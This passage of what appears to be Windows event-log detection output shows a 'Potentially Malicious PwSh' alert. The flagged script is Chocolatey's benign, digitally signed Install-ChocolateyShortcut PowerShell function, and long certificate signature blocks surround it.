ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgPavSbp9dQ2siazYDp0Amg+EIr+hM9dp7a+0W # HNXStdkwDQYJKoZIhvcNAQEBBQAEggEASoaLXJSP8+kK99AO2/eLEtUgHMzrBxAl # 3VzBEO3yPsYgKkF2KgZc4+FheBMEUJmGnqnZXUzigSJFj2yuCX9drT9SLDxYlqLs # 7Ua4a7P+6qNOI+fv4RgzDpKhDIfLSyNtjfin2TUO6nnmCmKXBHHCGl6wT+3jXZZN # OrP0DRckft9wI+yARwZnsliyJJMJVyJ1HWiWQ1NBv1E8kxeHyiEvOKFWMU5Fxjcj # shLQenOBAQ0zgPgtO+1Mv7tVKPC/mPwz0XreiGzGdSz4BVdzNX8eqWTKAgBPj3Mq # bPOn+9cJalY+K0OXF0qjKx27oDqAJTgXt+XxHQVVUY1bwypkep6pZaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU2WjAjBgkqhkiG9w0BCQQxFgQUnLpFbpv40cF+T1dB # 0ypaJ3jlTSowDQYJKoZIhvcNAQEBBQAEggEALrngzN2q5JHS+d5l8DxExXPtlQNA # JAKNBwqX67SWFfNfkxNZMFGuFchaQdB0k9VI0jWjfw79y4ZstY4f30i0ejf2v1MI # wjk6Hb02leUalNfkLJ15/LVbIj5GVbqc/ozZca6//w2OEt1UOBIEtM3ouv+WOnXk # yFTtR9F7HK8MLWRSnQf1BGYxHqcV9oUGVQUkIj81FVXz/O0ZH6fZ21ZFl17OJ/Yo # T4MurhlQWXSGtEaBioiyMD+EUOlEF41qxzxorydfgg3Y+UHLtOayryak/AVggpi/ # F8NPHe/rwVBbXO28fjwtMdy/eyXD9cV+07qiarT2sJI6LZWqo7ag34qtVw== # SIG # End signature block","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:32.573 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,62,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Install-ChocolateyShortcut { <# .SYNOPSIS Creates a shortcut .DESCRIPTION This adds a shortcut, at the specified location, with the option to specify a number of additional properties for the shortcut, such as Working Directory, Arguments, Icon Location, and Description. .NOTES If this errors, as it may if being run under the local SYSTEM account with particular folder that SYSTEM doesn't have, it will display a warning instead of failing a package installation. .INPUTS None .OUTPUTS None .PARAMETER ShortcutFilePath The full absolute path to where the shortcut should be created. .PARAMETER TargetPath The full absolute path to the target for new shortcut. .PARAMETER WorkingDirectory OPTIONAL - The full absolute path of the Working Directory that will be used by the new shortcut. As of v0.10.12, the directory will be created unless it contains environment variable expansion like `%AppData%\FooBar`. .PARAMETER Arguments OPTIONAL - Additonal arguments that should be passed along to the new shortcut. .PARAMETER IconLocation OPTIONAL- The full absolute path to an icon file to be used for the new shortcut. .PARAMETER Description OPTIONAL - A text description to be associated with the new description. .PARAMETER WindowStyle OPTIONAL - Type of windows target application should open with. Available in 0.9.10+. 0 = Hidden, 1 = Normal Size, 3 = Maximized, 7 - Minimized. Full list table 3.9 here: https://technet.microsoft.com/en-us/library/ee156605.aspx .PARAMETER RunAsAdmin OPTIONAL - Set ""Run As Administrator"" checkbox for the created the shortcut. Available in 0.9.10+. .PARAMETER PinToTaskbar OPTIONAL - Pin the new shortcut to the taskbar. Available in 0.9.10+. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # This will create a new shortcut at the location of ""C:\test.lnk"" and # link to the file located at ""C:\text.exe"" Install-ChocolateyShortcut -ShortcutFilePath ""C:\test.lnk"" -TargetPath ""C:\test.exe"" .EXAMPLE > # This will create a new shortcut at the location of ""C:\notepad.lnk"" # and link to the Notepad application. In addition, other properties # are being set to specify the working directory, an icon to be used for # the shortcut, along with a description and arguments. Install-ChocolateyShortcut ` -ShortcutFilePath ""C:\notepad.lnk"" ` -TargetPath ""C:\Windows\System32\notepad.exe"" ` -WorkingDirectory ""C:\"" ` -Arguments ""C:\test.txt"" ` -IconLocation ""C:\test.ico"" ` -Description ""This is the description"" .EXAMPLE > # Creates a new notepad shortcut on the root of c: that starts # notepad.exe as Administrator. Shortcut is also pinned to taskbar. # These parameters are available in 0.9.10+. Install-ChocolateyShortcut ` -ShortcutFilePath ""C:\notepad.lnk"" ` -TargetPath ""C:\Windows\System32\notepad.exe"" ` -WindowStyle 3 ` -RunAsAdmin ` -PinToTaskbar .LINK Install-ChocolateyDesktopLink .LINK Install-ChocolateyExplorerMenuItem .LINK Install-ChocolateyPinnedTaskBarItem #> param( [parameter(Mandatory=$true, Position=0)][string] $shortcutFilePath, [parameter(Mandatory=$true, Position=1)][string] $targetPath, [parameter(Mandatory=$false, Position=2)][string] $workingDirectory, [parameter(Mandatory=$false, Position=3)][string] $arguments, [parameter(Mandatory=$false, Position=4)][string] $iconLocation, [parameter(Mandatory=$false, Position=5)][string] $description, [parameter(Mandatory=$false, Position=6)][int] $windowStyle, [parameter(Mandatory=$false)][switch] $runAsAdmin, [parameter(Mandatory=$false)][switch] $pinToTaskbar, [parameter(ValueFromRemainingArguments = $true)][Object[]]$ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters # http://powershell.com/cs/blogs/tips/archive/2009/02/05/validating-a-url.aspx function isURIWeb($address) { $uri = $address -as [System.URI] $uri.AbsoluteURI -ne $null -and $uri.Scheme -match '[http|https]' } if (!$shortcutFilePath) { # shortcut file path could be null if someone is trying to get special # paths for LocalSystem (SYSTEM). Write-Warning ""Unable to create shortcut. `$shortcutFilePath can not be null."" return } $shortcutDirectory = $([System.IO.Path]::GetDirectoryName($shortcutFilePath)) if (!(Test-Path($shortcutDirectory))) { [System.IO.Directory]::CreateDirectory($shortcutDirectory) | Out-Null } if (!$targetPath) { throw ""Install-ChocolateyShortcut - `$targetPath can not be null."" } if(!(Test-Path($targetPath)) -and !(IsURIWeb($targetPath))) { Write-Warning ""'$targetPath' does not exist. If it is not created the shortcut will not be valid."" } if($iconLocation) { if(!(Test-Path($iconLocation))) { Write-Warning ""'$iconLocation' does not exist. A default icon will be used."" } } if ($workingDirectory) { if ($workingDirectory -notmatch '%\w+%' -and !(Test-Path($workingDirectory))) { [System.IO.Directory]::CreateDirectory($workingDirectory) | Out-Null } } Write-Debug ""Creating Shortcut..."" try { $global:WshShell = New-Object -com ""WScript.Shell"" $lnk = $global:WshShell.CreateShortcut($shortcutFilePath) $lnk.TargetPath = $targetPath $lnk.WorkingDirectory = $workingDirectory $lnk.Arguments = $arguments if($iconLocation) { $lnk.IconLocation = $iconLocation } if ($description) { $lnk.Description = $description } if ($windowStyle) { $lnk.WindowStyle = $windowStyle } $lnk.Save() Write-Debug ""Shortcut created."" [System.IO.FileInfo]$Path = $shortcutFilePath If ($runAsAdmin) { #In order to enable the ""Run as Admin"" checkbox, this code reads the .LNK as a stream # and flips a specific bit while writing a new copy. It then replaces the original # .LNK with the copy, similar to this example: http://poshcode.org/2513 $TempFileName = [IO.Path]::GetRandomFileName() $TempFile = [IO.FileInfo][IO.Path]::Combine($Path.Directory, $TempFileName) $Writer = New-Object System.IO.FileStream $TempFile, ([System.IO.FileMode]::Create) $Reader = $Path.OpenRead() While ($Reader.Position -lt $Reader.Length) { $Byte = $Reader.ReadByte() If ($Reader.Position -eq 22) {$Byte = 34} $Writer.WriteByte($Byte) } $Reader.Close() $Writer.Close() $Path.Delete() Rename-Item -Path $TempFile -NewName $Path.Name | Out-Null } If ($pinToTaskbar) { $scfilename = $Path.FullName $pinverb = (new-object -com ""shell.application"").namespace($(split-path -parent $Path.FullName)).Parsename($(split-path -leaf $Path.FullName)).verbs() | ?{$_.Name -eq 'Pin to Tas&kbar'} If ($pinverb) {$pinverb.doit()} } } catch { Write-Warning ""Unable to create shortcut. Error captured was $($_.Exception.Message)."" } } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCCV4kKnyvkP8Q6w # z2NjPs2m5xO4ValwoIiDMeri2Kx1gKCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # 